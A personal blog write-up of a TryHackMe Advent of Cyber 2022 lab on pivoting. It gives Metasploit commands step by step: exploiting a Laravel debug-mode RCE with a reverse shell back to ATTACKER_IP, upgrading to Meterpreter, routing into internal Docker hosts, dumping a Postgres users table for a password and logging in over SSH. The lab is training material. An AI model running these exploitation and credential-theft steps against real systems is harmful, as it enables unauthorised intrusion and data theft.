---
title: Advent Of Cyber 2022 Day 9
date: 2022-12-09 09.33.00 +/-TTTT
categories: [Try Hack Me, Advent OF Cyber 2022]
tags: [tryhackme,try hack me, hacking, advent of cyber, advent of cyber 2022, advent of cyber day 9]     # TAG names should always be lowercase
author: me
---

![day9](/assets/AOCD9/day9.png)

# *Dock The Halls*

## Overall Thoughts

This was a great day int the Advent of Cyber.  Pivoting is a technique that I still struggle with and it was great to see the challenge today helping to teach me more of that.  As well as more use of Metasploit which is one of the best frame works for Penetration testing.  I am so happy the challenge involved a few sessions and how to bounce back and forth with them and how to use each sessions to deploy payloads through.


## Getting Started

Today TryHackMe had us use the Kali Linux vm so after getting that set up I went ahead and deployed the room as normal.  Kali linux is not new to me but I do like the fact that TryHackMe is exposing new people to both Parrot and Kali.

### Getting Started

The first thing we should do is scan the IP address of the target machine.

Everyone has their normal flags they use for scanning but today I used the flags that the instructions provide the command to nmap scan is as follows

```console
nmap -T4 -A -Pn TargretIPAddress
```

Lets explain the flags they used

- -T0 through -T5
	+ Timing Template -T0 being the slowest scan -T5 being the fastest most aggressive scan
- -A
	+ Enavle OS detection, version detection, script scanning, and traceroute
- -Pn 
	+ Disables host discovery conducts port scan only

Here are the results of the scan

![nmap](/assets/AOCD9/nmap.png)

#### Question 1
The Nmap Scan will get us the answer to question 1

![q1](/assets/AOCD9/q1.png)

## Checking things out

Now we know that the target machine is running a webserver on port 80 we can open our web browser and visit the site.
After some poking around we find an interesting cookie

![cookie](/assets/AOCD9/cookie.png)

googling we can find that the application that uses that set-cookie could be vulnerable to remote code execution.  The easiest way to verify if the application is vulnerable is to use Metasploit to check.  So we start up Metasploit with this command

```console
msfconsole
```

Once Metasploit loads we can search for the applicaiton 

```console
msf6 > search laravel
```

then we load the module with the use command

```console
msf6 > use multi/php/ignition_laravel_debug_rce
```

now we can run the check command


```console
msf6 exploit(multi/php/ignition_laravel_debug_rce) > check rhost=TargtIPAddress
```

it appears to be vulnerable

![vuln](/assets/AOCD9/vuln.png)

#### Question 2
That confirms the answer to question 2

![q2](/assets/AOCD9/q2.png)

#### Question 3
You can look up the info of the vulnerabiliy to get the CVE number for question 3

![q3](/assets/AOCD9/q3.png)

now lets run this with the info we have 

```console
run rhost=10.10.185.9 lhost=ATTACKER_IP HttpClientTimeout=20
```
we have a shell

![access](/assets/AOCD9/access.png)

it is not a very strong shell so lets back ground it and try to upgrade it to a Meterpreter shell

here are the commands to do so 

#### Question 4

![q5](/assets/AOCD9/q4.png)

```console
background

sessions -u -1
```

now if we run the sessions command we ca see we have 2 sessions 

![sessions](/assets/AOCD9/sessions.png)


### Interacting with Meterpreter

Lets use the session that has the Meterpreter shell

```console
sessions -i sessionID
```

#### Question 5

looking around there is a specific file that lets us know this is a docker environment

![q5](/assets/AOCD9/q5.png)

#### Question 6

![q6](/assets/AOCD9/q6.png)

Take a look around and you will find the credentials file

![env](/assets/AOCD9/env.png)

 ### Navigating postgres
Now looking at the file we can see it looks like a postgres database is being run and we have the credentials for it. lets try to dump  the schema of the data base

First we are going to background the Meterpreter session so we can add some route to use

```console
route add 172.28.101.51/32 2

#

and

172.17.0.1/32 2
```
now let look for a function in Metasploit that can help us

 then we are going to search for postgres

```console
msf6 > search postgres
```

looking through the options we have 

```
16  auxiliary/scanner/postgres/postgres_schemadump
```

We are going to use that so we use the command

```console
use 16
```

we show options and set the required options.  In this case we just need to set the Rhost

```console
msf6 auxiliary(scanner/postgres/postgres_schemadump) > set rhost 172.28.101.51
```

now we can see that the info is dumped out and we can see a table called users that has a username and a password column.  This is very interesting lets try to get the information out of that

#### Question 7
![q7](/assets/AOCD9/q7.png)

### Getting SQL info

We are going to keep using Metasploit 

searching for postgres we see an option for Generic Query lets use that 

![sql](/assets/AOCD9/sql.png)

showing the options we have some things to set

```console
set rhost 172.28.101.51

set database postgres

set sql "select * from users"
```

now we can run it and we get santas password

#### Question 8 

![q8](/assets/AOCD9/q8.png)

![pass](/assets/AOCD9/santaspassword.png)

### Setting up proxychains

Next we are going to use sock proxy to be able to nmap scan the other machine in the docker environment. It is best to follow the instructions in the room but once done you get and NMAP scan results.

![remotenmap](/assets/AOCD9/nmapproxy.png)

#### Question 9
This will answer question 9
![q9](/assets/AOCD9/q9.png)

### Metasploit SSH login

Now that we know SSH is on open and we have some credientials we can use metasploit to SSH into what I am hoping is the root server

```console
use auxiliary/scanner/ssh/ssh_login
```

the options needing to be set

```console
set username santa

set password p4$$w0rd

set rhost 172.17.0.1
```

once those are all set we can run the exploit.  Once complete we can run the sessions command and see we have a new session with SSH

![sshs](/assets/AOCD9/sshs.png)

Lets interact with that session

```console
sessions -i 3
```

#### Question 10

Having a look around we can find the flag

![flag](/assets/AOCD9/flag.png)

## Conclusion
Overall great room took longer than expected but still a great lesson on getting to one machine through another.


